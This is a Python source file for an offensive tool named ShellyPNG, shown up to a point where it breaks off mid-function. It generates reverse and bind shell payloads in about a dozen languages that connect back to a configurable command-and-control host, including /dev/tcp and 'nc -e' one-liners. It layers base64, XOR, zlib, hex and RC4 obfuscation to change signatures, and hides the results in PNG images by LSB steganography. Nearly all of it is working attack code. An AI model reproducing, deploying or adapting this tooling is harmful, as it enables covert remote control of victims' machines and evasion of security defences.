#!/usr/bin/env python3
import base64
import socket
import ssl
import threading
import os
import random
import string
import time
import argparse
import sys
import zlib
import codecs
import hashlib
import json
import urllib.request
import platform
from io import BytesIO

# --- Dependency Checks ---
try:
    from PIL import Image
except ImportError:
    print("\033[91mERROR: Pillow library not found. Please install it:\033[0m")
    print("pip install Pillow")
    sys.exit(1)

try:
    import inquirer # type: ignore
except ImportError:
    inquirer = None
    print("\033[93mWARNING: inquirer library not found. Interactive mode will use basic prompts.\033[0m")
    print("\033[93mInstall it for a better experience: pip install inquirer\033[0m")

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    class DummyColorama:
        def __getattr__(self, name): return ""
    Fore = Style = Back = DummyColorama()
    print("\033[91mERROR: colorama library not found. Install for colors: pip install colorama\033[0m")

try:
    from tqdm import tqdm
except ImportError:
    def tqdm(iterable=None, **kwargs):
        print("\033[93mWARNING: tqdm library not found. Progress bars disabled. Install: pip install tqdm\033[0m")
        if iterable: yield from iterable
        else:
            class DummyTqdm:
                def __enter__(self): return self
                def __exit__(self, *args): pass
                def update(self, n=1): pass
                def close(self): pass
            return DummyTqdm()
    tqdm.close = lambda: None


# --- New Matrin Rain Banner ---
def animate_matrin_rain_banner():
    """Displays the new 'Matrin Rain' animated banner."""
    term_width = os.get_terminal_size().columns
    clear_cmd = 'cls' if os.name == 'nt' else 'clear'

    colors = [Fore.RED, Fore.LIGHTBLACK_EX, Fore.WHITE, Fore.RED, Fore.MAGENTA, Fore.CYAN]
    styles = [Style.BRIGHT, Style.DIM, Style.NORMAL]

    # ASCII Art inspired by ashijacker1.sh banner
    art_lines = [
        "███████╗██╗  ██╗███████╗██╗     ██╗     ███████╗███╗   ██╗ ██████╗ ",
        "██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝████╗  ██║██╔════╝ ",
        "███████╗███████║█████╗  ██║     ██║     ███████╗██╔██╗ ██║██║  ███╗",
        "╚════██║██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║╚██╗██║██║   ██║",
        "███████║██║  ██║███████╗███████╗███████╗███████╗██║ ╚████║╚██████╔╝",
        "╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ "
    ]

    glitch_chars = ['▓', '▒', '░', '*', '#', '$', '%', '&']

    def apply_fx(line):
        """Apply random color/style/glitch effects."""
        new_line = ""
        use_color = random.choice(colors)
        use_style = random.choice(styles)
        for char in line:
            if char != ' ' and random.random() < 0.1: # 10% chance to glitch non-space chars
                new_line += use_color + use_style + random.choice(glitch_chars) + Style.RESET_ALL
            elif char != ' ':
                new_line += use_color + use_style + char + Style.RESET_ALL
            else:
                new_line += ' '
        return new_line

    start_time = time.time()
    while time.time() - start_time < 8: # Longer animation (8 seconds)
        os.system(clear_cmd)
        print("\n" * 2) # Add some top margin
        for line in art_lines:
            print(apply_fx(line).center(term_width))
        print("\n")

        title = "§ S H E L L Y . P N G §"
        subtitle = f"// M A T R I N . R A I N // {Fore.RED}EDITION{Style.RESET_ALL}"
        version = "v5.0 - Phantom Shell"

        print(random.choice(styles) + random.choice(colors) + title.center(term_width) + Style.RESET_ALL)
        print(random.choice(styles) + random.choice(colors) + subtitle.center(term_width) + Style.RESET_ALL)
        print(f"{Fore.RED}{Style.DIM}{version}{Style.RESET_ALL}".center(term_width))

        time.sleep(random.uniform(0.1, 0.25))

    # Final static display
    os.system(clear_cmd)
    print("\n" * 2)
    final_color = Fore.RED
    for line in art_lines:
       print(final_color + Style.BRIGHT + line.center(term_width) + Style.RESET_ALL)
    print("\n")
    print(f"{Fore.WHITE}{Style.BRIGHT}{title.center(term_width)}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{Style.BRIGHT}{subtitle.center(term_width)}{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.DIM}{version}{Style.RESET_ALL}".center(term_width))
    print(f"\n{Fore.CYAN}GitHub: https://github.com/ash/shellypng{Style.RESET_ALL}".center(term_width))
    print(f"{Fore.LIGHTBLACK_EX}----------------------------------------------------------{Style.RESET_ALL}".center(term_width))
    print()


# --- Default Configurations ---
DEFAULT_C2_HOST = "127.0.0.1"
DEFAULT_C2_PORT = 1337 # Common C2 port
DEFAULT_IMAGE = "input_image.png"
DEFAULT_OUTPUT = "shadow.png"
DEFAULT_PAYLOAD_TYPE = "python_reverse_tcp"
DEFAULT_OBFUSCATION_LEVEL = 1
DEFAULT_BITS_PER_CHANNEL = 1

# --- Obfuscation Engine ---
class Obfuscator:
    @staticmethod
    def generate_random_string(length=12): # Longer random names
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def base64_encode(data, layers=1):
        encoded = data
        for _ in range(layers):
            if isinstance(encoded, str): encoded = encoded.encode('utf-8')
            encoded = base64.b64encode(encoded).decode('utf-8')
        return encoded # Return string, let caller handle chunking/bytes

    @staticmethod
    def xor_encrypt(data, key=None):
        if isinstance(data, str): data = data.encode('utf-8')
        if key is None: key = os.urandom(random.randint(16, 32)) # Longer random key
        elif isinstance(key, str): key = key.encode('utf-8')
        encrypted = bytearray(data[i] ^ key[i % len(key)] for i in range(len(data)))
        return bytes(encrypted), key

    @staticmethod
    def hex_encode(data):
        if isinstance(data, str): data = data.encode('utf-8')
        return data.hex()

    @staticmethod
    def compress_zlib(data):
        if isinstance(data, str): data = data.encode('utf-8')
        # Add random null bytes to slightly alter compressed output size/signature
        data = data + os.urandom(random.randint(0, 8))
        return zlib.compress(data, level=9)

    @staticmethod
    def rc4_encrypt(data, key=None):
        if isinstance(data, str): data = data.encode('utf-8')
        if key is None: key = os.urandom(random.randint(16, 32))
        elif isinstance(key, str): key = key.encode('utf-8')
        
        # RC4 key scheduling algorithm
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # RC4 stream generation and encryption
        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        
        return bytes(result), key

    @staticmethod
    def obfuscate(payload_str, level=1):
        if level == 0: return payload_str.encode('utf-8'), []

        steps = []
        obfuscated_data = payload_str.encode('utf-8')
        available_tech = ['base64', 'xor', 'zlib', 'hex', 'rc4']

        if level == 1: # Simple, randomized single technique
            choice = random.choice(available_tech)
            try:
                if choice == 'base64':
                    layers = random.randint(1, 2)
                    obfuscated_data = Obfuscator.base64_encode(obfuscated_data, layers=layers).encode('utf-8')
                    steps.append({'type': 'base64', 'layers': layers})
                elif choice == 'xor':
                    obfuscated_data, key = Obfuscator.xor_encrypt(obfuscated_data)
                    steps.append({'type': 'xor', 'key': key})
                elif choice == 'zlib':
                    obfuscated_data = Obfuscator.compress_zlib(obfuscated_data)
                    steps.append({'type': 'zlib_compress'})
                elif choice == 'hex':
                    obfuscated_data = Obfuscator.hex_encode(obfuscated_data).encode('utf-8')
                    steps.append({'type': 'hex'})
                elif choice == 'rc4':
                    obfuscated_data, key = Obfuscator.rc4_encrypt(obfuscated_data)
                    steps.append({'type': 'rc4', 'key': key})
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Warning: Obfuscation step '{choice}' failed: {e}{Style.RESET_ALL}")
                # Fallback to simple base64 if chosen tech fails
                if not steps:
                     obfuscated_data = Obfuscator.base64_encode(payload_str.encode('utf-8'), layers=1).encode('utf-8')
                     steps.append({'type': 'base64', 'layers': 1})

        elif level >= 2: # Layered Random
            num_layers = random.randint(2, len(available_tech)) # Apply 2 up to all techniques
            applied_tech = random.sample(available_tech, num_layers)

            for choice in applied_tech:
                current_data_before_step = obfuscated_data # Store in case step fails
                try:
                    if choice == 'base64':
                        layers = 1 # Only 1 layer when combined
                        b64_str = Obfuscator.base64_encode(obfuscated_data, layers=layers)
                        obfuscated_data = b64_str.encode('utf-8') # Need bytes for next step
                        steps.append({'type': 'base64', 'layers': layers})
                    elif choice == 'xor':
                        obfuscated_data, key = Obfuscator.xor_encrypt(obfuscated_data)
                        steps.append({'type': 'xor', 'key': key})
                    elif choice == 'zlib':
                        obfuscated_data = Obfuscator.compress_zlib(obfuscated_data)
                        steps.append({'type': 'zlib_compress'})
                    elif choice == 'hex':
                        hex_str = Obfuscator.hex_encode(obfuscated_data)
                        obfuscated_data = hex_str.encode('utf-8') # Need bytes
                        steps.append({'type': 'hex'})
                    elif choice == 'rc4':
                        obfuscated_data, key = Obfuscator.rc4_encrypt(obfuscated_data)
                        steps.append({'type': 'rc4', 'key': key})
                except Exception as e:
                    print(f"{Fore.YELLOW}[!] Warning: Obfuscation step '{choice}' failed: {e}. Skipping step.{Style.RESET_ALL}")
                    obfuscated_data = current_data_before_step # Revert to before failed step

        if not steps: # Ensure at least B64 if all else failed
            obfuscated_data = Obfuscator.base64_encode(payload_str.encode('utf-8'), layers=1).encode('utf-8')
            steps.append({'type': 'base64', 'layers': 1})

        deobfuscation_steps = steps[::-1]
        return obfuscated_data, deobfuscation_steps


# --- Payload Generator ---
class PayloadGenerator:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.instance_id = Obfuscator.generate_random_string(6)

    def _obfuscate_ps_string(self, s):
        """Obfuscates a string for PowerShell using char codes."""
        if not s: return "''"
        # Randomly choose between simple join and char array join
        if random.random() < 0.6: # 60% chance for char codes
             char_codes = [str(ord(c)) for c in s]
             return f"(-join ([char[]]({','.join(char_codes)})))"
        else: # Simple string concatenation
             parts = []
             while len(s) > 0:
                 split_at = random.randint(1, max(1, len(s)//2))
                 parts.append(f"'{s[:split_at]}'")
                 s = s[split_at:]
             return "+".join(parts) if parts else "''"

    def get_payload(self, payload_type):
        lhost = self.c2_host
        lport = self.c2_port
        rand_id = self.instance_id # For use in payload commands

        payloads = {
            "powershell_reverse_tcp": f"""
$ErrorActionPreference = 'SilentlyContinue'; $ConfirmPreference = 'None';
$s = New-Object System.Net.Sockets.TCPClient('{lhost}', {lport}); if(-not $s) {{ exit 1 }};
$st = $s.GetStream(); $b = New-Object System.Byte[] $s.ReceiveBufferSize;
$enc = [System.Text.Encoding]::UTF8;
$prompt = $enc.GetBytes(({{PS $(pwd)> }} | Out-String)); $st.Write($prompt, 0, $prompt.Length);
while (($i = $st.Read($b, 0, $b.Length)) -ne 0) {{
    $d = $enc.GetString($b, 0, $i).Trim();
    if ($d -eq ({self._obfuscate_ps_string('exit')})) {{ break }};
    $o = (iex $d 2>&1 | Out-String);
    $prompt = $enc.GetBytes((("{{$o}}`n" | Out-String) + (PS $(pwd)> ) | Out-String));
    $st.Write($prompt, 0, $prompt.Length); $st.Flush()
}}; $s.Close()
""",
            "bash_reverse_tcp": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "bash_mkfifo": f"FIFO=/tmp/inf_{rand_id}; rm -f $FIFO; mkfifo $FIFO; cat $FIFO | bash -i 2>&1 | nc {lhost} {lport} > $FIFO",
            "python_reverse_tcp": f"""import socket as s,subprocess as p,os as o;h='{lhost}';P={lport};so=s.socket(s.AF_INET,s.SOCK_STREAM);so.connect((h,P));o.dup2(so.fileno(),0);o.dup2(so.fileno(),1);o.dup2(so.fileno(),2);p.call(['/bin/bash','-i'])""",
            "php_reverse_tcp": f"""php -r '$s=fsockopen("{lhost}",{lport});exec("/bin/bash -i <&3 >&3 2>&3");'""",
            "perl_reverse_tcp": f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
            "nc_reverse_tcp": f"nc -e /bin/bash {lhost} {lport}",
            "nc_mkfifo": f"FIFO=/tmp/inf_{rand_id}; rm -f $FIFO; mkfifo $FIFO; cat $FIFO | /bin/bash -i 2>&1 | nc {lhost} {lport} > $FIFO",
            "ruby_reverse_tcp": f"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("{lhost}","{lport}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
            "nodejs_reverse_tcp": f"""require('child_process').exec('nc -e /bin/bash {lhost} {lport}')""",
            "golang_reverse_tcp": f"""package main;import("net";"os/exec";"syscall");func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/bash");cmd.SysProcAttr=&syscall.SysProcAttr{{Setpgid:true}};cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}""",
            "python_bind_tcp": f"""import socket as s,subprocess as p;so=s.socket(s.AF_INET,s.SOCK_STREAM);so.bind(('0.0.0.0',{lport}));so.listen(1);c,a=so.accept();while True:d=c.recv(1024).decode();if not d:break;p=p.Popen(d,shell=True,stdout=p.PIPE,stderr=p.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""",
            "powershell_bind_tcp": f"""
$l = New-Object System.Net.Sockets.TcpListener('0.0.0.0', {lport});
$l.Start();
$c = $l.AcceptTcpClient();
$s = $c.GetStream();
$b = New-Object System.Byte[] $c.ReceiveBufferSize;
$e = New-Object System.Text.UTF8Encoding;
$p = $e.GetBytes('PS ' + (pwd).Path + '> ');
$s.Write($p, 0, $p.Length);
while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {{
    $d = $e.GetString($b, 0, $i).Trim();
    if ($d -eq 'exit') {{ break }};
    $o = (iex $d 2>&1 | Out-String);
    $r = $e.GetBytes($o + 'PS ' + (pwd).Path + '> ');
    $s.Write($r, 0, $r.Length);
}}
$l.Stop();
"""
        }

        if payload_type in payloads:
            return payloads[payload_type]
        else:
            raise ValueError(f"Unsupported payload type: {payload_type}")

# --- Steganography Engine (Unchanged Structurally) ---
class StegoEngine:
    END_OF_MESSAGE_MARKER = b"\xDE\xC0\xAD\xDE" # More binary marker

    @staticmethod
    def _int_to_bytes(n, length): return n.to_bytes(length, byteorder='big')
    @staticmethod
    def _bytes_to_int(b): return int.from_bytes(b, byteorder='big')

    @staticmethod
    def embed(image_path, data_bytes, output_path, bits_per_channel=1, use_alpha=False, verbose=False):
        # ... (Embedding logic - same as previous version, using new EOM marker) ...
        stego_log = lambda msg, lvl="info": ShellyPng.static_log(msg, lvl, verbose)
        stego_log(f"Loading source image: {image_path}", "info")
        try:
            img = Image.open(image_path); img_format = img.format
        except FileNotFoundError:
            stego_log(f"Image not found: {image_path}. Creating blank.", "warning")
            img = Image.new("RGB", (400, 300), color=(10, 0, 0)); img_format = 'PNG'
            try: img.save(image_path, format=img_format)
            except Exception as save_err: stego_log(f"Could not save placeholder image: {save_err}", "warning")
        except Exception as e: stego_log(f"Error loading image {image_path}: {e}", "error"); return False

        target_mode = "RGBA" if use_alpha and 'A' in img.getbands() else "RGB"
        if img.mode != target_mode:
            try: img = img.convert(target_mode); stego_log(f"Converted image to {target_mode}", "debug")
            except Exception as conv_e: stego_log(f"Cannot convert image to {target_mode}: {conv_e}", "error"); return False
        pixels = img.load(); width, height = img.size; channels = len(img.getbands())
        stego_log(f"Image: {width}x{height}, Mode={img.mode}, Channels={channels}, BPC={bits_per_channel}", "debug")

        data_to_embed = StegoEngine._int_to_bytes(len(data_bytes), 4) + data_bytes + StegoEngine.END_OF_MESSAGE_MARKER
        total_bits_needed = len(data_to_embed) * 8
        max_bits = width * height * channels * bits_per_channel
        if total_bits_needed > max_bits:
            stego_log(f"Payload too large! Needs {total_bits_needed} bits, capacity {max_bits} bits.", "error")
            stego_log(f"Required: {len(data_to_embed)} bytes, Max: {max_bits // 8} bytes.", "error")
            return False

        bit_stream = ''.join(format(byte, '08b') for byte in data_to_embed); bit_index = 0
        mask = (1 << bits_per_channel) - 1; clear_mask = ~mask
        stego_log("Embedding data into the shadows...", "info")
        pixels_modified = 0

        with tqdm(total=total_bits_needed, desc=f"Weaving ({bits_per_channel}-bit LSB)", unit="bit", disable=not verbose, ncols=80, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} bits') as pbar:
            for y in range(height):
                for x in range(width):
                    if bit_index >= total_bits_needed: break
                    pixel_list = list(pixels[x, y])
                    modified = False
                    for c in range(channels):
                        if bit_index >= total_bits_needed: break
                        bits_to_embed_str = bit_stream[bit_index : min(bit_index + bits_per_channel, len(bit_stream))]
                        if not bits_to_embed_str: continue # Safety check
                        bits_to_embed_int = int(bits_to_embed_str, 2)
                        original_channel_value = pixel_list[c]
                        new_channel_value = (original_channel_value & clear_mask) | bits_to_embed_int
                        if new_channel_value != original_channel_value: modified = True
                        pixel_list[c] = new_channel_value
                        bits_advanced = len(bits_to_embed_str)
                        pbar.update(bits_advanced)
                        bit_index += bits_advanced
                    if modified: pixels[x, y] = tuple(pixel_list); pixels_modified += 1
                if bit_index >= total_bits_needed: break
        stego_log(f"Weaving complete. {pixels_modified} pixels altered.", "success" if pixels_modified > 0 else "info")
        stego_log(f"Saving spectral image to: {output_path}", "info")
        try:
            save_format = 'PNG' if img_format not in ['PNG', 'BMP', 'TIFF'] else img_format
            if save_format != img_format: stego_log(f"Original format {img_format}, saving as {save_format} for LSB.", "warning")
            img.save(output_path, format=save_format, quality=100, optimize=False)
            stego_log(f"Image imprinted successfully: {output_path} ({save_format}).", "success")
            return True
        except Exception as e: stego_log(f"Error saving spectral image {output_path}: {e}", "error"); return False

    @staticmethod
    def extract(image_path, bits_per_channel=1, use_alpha=False, verbose=False):
        # ... (Extraction logic - same as previous version, using new EOM marker) ...
        stego_log = lambda msg, lvl="info": ShellyPng.static_log(msg, lvl, verbose)
        stego_log(f"Loading spectral image: {image_path}", "info")
        try: img = Image.open(image_path)
        except Exception as e: stego_log(f"Error loading image {image_path}: {e}", "error"); return None

        img_mode = img.mode; channels = len(img.getbands())
        target_mode = "RGBA" if use_alpha and 'A' in img.getbands() else "RGB"
        if img.mode != target_mode and not (target_mode == "RGB" and img.mode == "RGBA"):
             try: img = img.convert(target_mode); stego_log(f"Normalized image to {target_mode}", "debug"); channels = len(img.getbands())
             except Exception as conv_e: stego_log(f"Cannot normalize image to {target_mode}: {conv_e}", "error"); return None
        elif target_mode == "RGB" and img.mode == "RGBA": channels = 3
        pixels = img.load(); width, height = img.size

        stego_log(f"Extracting shadows (BPC: {bits_per_channel}, Alpha: {use_alpha}, Mode: {img.mode})", "info")
        mask = (1 << bits_per_channel) - 1
        extracted_bits = ""; payload_size = -1; extracted_data = bytearray(); bits_needed_for_size = 32
        PAYLOAD_SIZE_HOLDER = -1

        with tqdm(total=width*height*channels*bits_per_channel, desc=f"Extracting ({bits_per_channel}-bit LSB)", unit="bit", disable=not verbose, ncols=80, bar_format='{l_bar}{bar}| Reading pixels...') as pbar:
            try:
                for y in range(height):
                    for x in range(width):
                        pixel_list = pixels[x, y]
                        for c in range(channels):
                            channel_value = pixel_list[c]
                            extracted_lsbs = channel_value & mask
                            extracted_bits += format(extracted_lsbs, f'0{bits_per_channel}b')
                            pbar.update(bits_per_channel)

                            if payload_size == -1 and len(extracted_bits) >= bits_needed_for_size:
                                size_bits = extracted_bits[:bits_needed_for_size]
                                size_bytes_list = [int(size_bits[i:i+8], 2) for i in range(0, bits_needed_for_size, 8)]
                                try: payload_size = StegoEngine._bytes_to_int(bytes(size_bytes_list))
                                except: payload_size = -2
                                PAYLOAD_SIZE_HOLDER = payload_size
                                if payload_size < 0 or payload_size > (width*height*channels*bits_per_channel // 8 + 100): # Add buffer
                                     stego_log(f"Implausible payload size extracted: {payload_size}. Aborting.", "error"); return None
                                stego_log(f"Payload size marker: {payload_size} bytes", "debug")
                                extracted_bits = extracted_bits[bits_needed_for_size:]

                            if payload_size != -1:
                                while len(extracted_bits) >= 8:
                                    byte_str = extracted_bits[:8]
                                    extracted_data.append(int(byte_str, 2))
                                    extracted_bits = extracted_bits[8:]
                                    if len(extracted_data) >= payload_size + len(StegoEngine.END_OF_MESSAGE_MARKER):
                                        if extracted_data[payload_size : payload_size + len(StegoEngine.END_OF_MESSAGE_MARKER)] == StegoEngine.END_OF_MESSAGE_MARKER:
                                            stego_log("End-Of-Message sequence found.", "debug")
                                            actual_payload = bytes(extracted_data[:payload_size])
                                            stego_log(f"Successfully extracted {len(actual_payload)} shadow bytes.", "success")
                                            pbar.close(); return actual_payload
            except Exception as e: stego_log(f"Error during extraction loop: {e}", "error"); return None

        stego_log("Extraction finished, EOM sequence not found or data incomplete.", "error")
        if PAYLOAD_SIZE_HOLDER > 0 : return bytes(extracted_data[:PAYLOAD_SIZE_HOLDER]) if len(extracted_data) >= PAYLOAD_SIZE_HOLDER else None
        return None

# --- Main ShellyPng Class ---
class ShellyPng:
    """
    ShellyPng v4.0 - Matrin Rain Shadow Shell

    Generates diverse shells, applies polymorphic obfuscation,
    and optionally hides them within PNG images using LSB steganography.
    """
    def __init__(self, **kwargs):
        self.c2_host = kwargs.get('c2_host', DEFAULT_C2_HOST)
        self.c2_port = kwargs.get('c2_port', DEFAULT_C2_PORT)
        self.image_path = kwargs.get('image_path')
        self.output_path = kwargs.get('output_path')
        self.payload_type = kwargs.get('payload_type', DEFAULT_PAYLOAD_TYPE)
        self.obfuscation_level = kwargs.get('obfuscation_level', DEFAULT_OBFUSCATION_LEVEL)
        self.bits_per_channel = min(max(1, kwargs.get('bits_per_channel', DEFAULT_BITS_PER_CHANNEL)), 8)
        self.use_alpha = kwargs.get('use_alpha', False)
        self.listen_host = kwargs.get('listen_host', "0.0.0.0")
        self.mode = kwargs.get('mode', 'stego')
        self.verbose = kwargs.get('verbose', False)
        self.quiet = kwargs.get('quiet', False)
        self.last_deobfuscation_steps = []

        # Input validation
        if self.mode == 'stego' and not (self.image_path and self.output_path):
            raise ValueError("Image input and output paths are required for stego mode.")
        if any(pt in self.payload_type for pt in ['tcp', 'nc']) and not self.c2_host:
             if self.mode == 'generate':
                  print(f"{Fore.YELLOW}[!] Warning: C2 Host not specified for reverse shell. Using default: {DEFAULT_C2_HOST}{Style.RESET_ALL}")
                  self.c2_host = DEFAULT_C2_HOST
             # No error needed here as PayloadGenerator uses defaults

        self.payload_generator = PayloadGenerator(self.c2_host, self.c2_port)

    @staticmethod
    def static_log(message, level="info", verbose=True):
        # ... (Static logging - same as previous) ...
        if not verbose and level == "debug": return
        prefix_map = {
            "info": f"{Fore.BLUE}[*]{Style.RESET_ALL}", "success": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
            "warning": f"{Fore.YELLOW}[!]{Style.RESET_ALL}", "error": f"{Fore.RED}[X]{Style.RESET_ALL}",
            "debug": f"{Fore.MAGENTA}[D]{Style.RESET_ALL}", "input": f"{Fore.CYAN}[?]{Style.RESET_ALL}"
        }
        print(f"{prefix_map.get(level, '[*]')} {message}")

    def log(self, message, level="info"):
        if self.quiet and level not in ["error", "success"]: return
        ShellyPng.static_log(message, level, self.verbose)

    def _build_deobfuscation_code(self, steps, target_lang='python'):
        # ... (Deobfuscation code builder - same logic as previous version) ...
        # Returns tuple: (import_string + code_string, final_variable_name)
        code = ""
        current_var = "final_payload_bytes"

        if target_lang == 'python':
            imports = set(['base64', 'sys']) # Add sys for stderr
            # The initial data bytes will be embedded directly into the script
            code += f"# Initial raw bytes embedded\n" # Placeholder comment

            for step in steps:
                next_var = f"s_{Obfuscator.generate_random_string(4)}"
                code += f"print(f'{Fore.MAGENTA}[D]{Style.RESET_ALL} Deobfuscating step: {step['type']}', file=sys.stderr)\n"
                if step['type'] == 'hex':
                    imports.add('codecs')
                    code += f"{next_var} = codecs.decode({current_var}, 'hex')\n"
                elif step['type'] == 'zlib_compress':
                    imports.add('zlib')
                    code += f"{next_var} = zlib.decompress({current_var})\n" # Direct decompress
                elif step['type'] == 'xor':
                    key_repr = repr(step['key'])
                    key_var = f"k_{Obfuscator.generate_random_string(4)}"
                    code += f"{key_var} = {key_repr}\n"
                    code += f"{next_var} = bytes(db ^ {key_var}[i % len({key_var})] for i, db in enumerate({current_var}))\n"
                elif step['type'] == 'base64':
                    decode_logic = current_var
                    for _ in range(step['layers']): decode_logic = f"base64.b64decode({decode_logic})"
                    code += f"{next_var} = {decode_logic}\n"
                code += f"print(f'{Fore.MAGENTA}[D]{Style.RESET_ALL} Step result type: {{type({next_var})}}, len: {{len({next_var}) if hasattr({next_var}, \"__len__\") else \"N/A\"}}', file=sys.stderr)\n" # Debug info
                current_var = next_var

            final_code_var = "final_payload_code"
            code += f"print(f'{Fore.BLUE}[*]{Style.RESET_ALL} Attempting final decode to UTF-8...')\n"
            code += f"try:\n    {final_code_var} = {current_var}.decode('utf-8')\n"
            code += f"except Exception as dec_e:\n    print(f'{Fore.YELLOW}[!] Warning: Could not decode final payload as UTF-8 ({{dec_e}}). Using raw bytes.{Style.RESET_ALL}', file=sys.stderr)\n    {final_code_var} = {current_var}\n" # Keep as bytes if decode fails

            import_str = '\n'.join(f"import {m}" for m in sorted(list(imports)))
            return import_str + '\n' + code, final_code_var

        # Add other language deobfuscation builders if needed (PS, Bash)
        elif target_lang == 'powershell':
             ps_code = f"$CurrentBytes = [System.Convert]::FromBase64String({self.last_payload_representation_for_extractor})\n" # Assume starts as b64 string var
             ps_current_var = "$CurrentBytes"
             # ... (rest of PS deobfuscation logic from previous version) ...
             # Ensure it handles the 'hex' step added to Obfuscator
             for step in steps:
                 ps_next_var = f"$Step_{Obfuscator.generate_random_string(4)}"
                 if step['type'] == 'hex':
                     ps_code += f"$HexStr = [System.Text.Encoding]::UTF8.GetString({ps_current_var}); "
                     ps_code += f"$Bytes = New-Object byte[] ($HexStr.Length / 2); "
                     ps_code += f"for ($i=0; $i -lt $HexStr.Length; $i+=2) {{ $Bytes[$i/2] = [convert]::ToByte($HexStr.Substring($i, 2), 16) }}; "
                     ps_code += f"{ps_next_var} = $Bytes\n"
                 elif step['type'] == 'zlib_compress':
                     ps_code += f"Add-Type -AssemblyName System.IO.Compression; $MS = New-Object System.IO.MemoryStream(,{ps_current_var}); try {{ $MS.Seek(2, [System.IO.SeekOrigin]::Begin) | Out-Null }} catch {{}}; $DS = New-Object System.IO.Compression.DeflateStream($MS, [System.IO.Compression.CompressionMode]::Decompress); $SR = New-Object System.IO.StreamReader($DS); {ps_next_var} = $SR.ReadToEnd(); $SR.Close(); $DS.Close(); $MS.Close();\n"
                 elif step['type'] == 'xor':
                      key_b64 = base64.b64encode(step['key']).decode('utf-8')
                      ps_key_var = f"$k_{Obfuscator.generate_random_string(4)}"
                      ps_res_var = f"$r_{Obfuscator.generate_random_string(4)}"
                      ps_code += f"{ps_key_var} = [System.Convert]::FromBase64String('{key_b64}'); "
                      ps_code += f"{ps_res_var} = New-Object byte[] {ps_current_var}.Length; "
                      ps_code += f"for ($i=0; $i -lt {ps_current_var}.Length; $i++) {{ {ps_res_var}[$i] = {ps_current_var}[$i] -bxor {ps_key_var}[$i % {ps_key_var}.Length] }}; "
                      ps_code += f"{ps_next_var} = {ps_res_var}\n"
                 elif step['type'] == 'base64':
                      decode_logic = ps_current_var
                      for _ in range(step['layers']): decode_logic = f"[System.Convert]::FromBase64String({decode_logic})"
                      ps_code += f"{ps_next_var} = {decode_logic}\n"

                 ps_current_var = ps_next_var
             ps_final_code_var = "$FinalPayloadCode"
             ps_code += f"if ({ps_current_var} -is [byte[]]) {{ {ps_final_code_var} = [System.Text.Encoding]::UTF8.GetString({ps_current_var}) }} else {{ {ps_final_code_var} = {ps_current_var} }};"

             return ps_code, ps_final_code_var

        return "", "final_payload_bytes" # Fallback


    def generate(self):
        self.log(f"Initiating Mode: {self.mode}", "info")
        self.log(f"Payload profile: {self.payload_type}", "info")
        try:
            raw_payload = self.payload_generator.get_payload(self.payload_type)
            self.log(f"Raw payload constructed ({len(raw_payload)} bytes)", "debug")
        except ValueError as e:
            self.log(str(e), "error"); return False, None

        self.log(f"Applying obfuscation profile: Level {self.obfuscation_level}", "info")
        obfuscated_payload_bytes, deobfuscation_steps = Obfuscator.obfuscate(raw_payload, self.obfuscation_level)
        self.last_deobfuscation_steps = deobfuscation_steps

        self.log(f"Obfuscated payload size: {len(obfuscated_payload_bytes)} bytes", "debug")
        if deobfuscation_steps: self.log(f"Applied obfuscation steps: {[(s['type']) for s in deobfuscation_steps]}", "debug")

        if self.mode == 'generate_only':
            self.log("Generate-Only Mode: Crafting execution guidance.", "info")
            payload_b64 = base64.b64encode(obfuscated_payload_bytes).decode('utf-8')
            guidance = f"# ShellyPNG v4.0 - Payload Guidance\n"
            guidance += f"# Target Profile: {self.payload_type}\n"
            guidance += f"# Obfuscation Level: {self.obfuscation_level} Steps: {[(s['type']) for s in deobfuscation_steps]}\n\n"
            guidance += f"# 1. Obfuscated Payload (Base64 Encoded):\n"
            guidance += f'PAYLOAD_B64="{payload_b64}"\n\n'
            guidance += f"# 2. Deobfuscation & Execution (Example Snippets):\n"

            target_lang = 'powershell' if 'powershell' in self.payload_type else \
                           'bash' if any(sh in self.payload_type for sh in ['bash', 'nc']) else \
                           'python' if 'python' in self.payload_type else \
                           'php' if 'php' in self.payload_type else \
                           'perl' if 'perl' in self.payload_type else \
                           'ruby' if 'ruby' in self.payload_type else \
                           'nodejs' if 'nodejs' in self.payload_type else 'unknown'

            if target_lang != 'unknown':
                try:
                    # Embed the B64 payload directly into the deobfuscation snippet for PS/Py
                    self.last_payload_representation_for_extractor = f'"{payload_b64}"' # PS needs var name, Py needs string
                    if target_lang == 'python': self.last_payload_representation_for_extractor = f'b"{payload_b64}"' # Py needs bytes literal

                    deob_code, final_var = self._build_deobfuscation_code(self.last_deobfuscation_steps, target_lang)

                    if target_lang == 'bash':
                         guidance += f'echo $PAYLOAD_B64 | base64 -d # Pipe through commands for: {[(s["type"]) for s in self.last_deobfuscation_steps]}\n'
                         guidance += f'# Example: echo $PAYLOAD_B64 | base64 -d | xxd -r -p | python3 ... | bash\n' # Add example based on steps
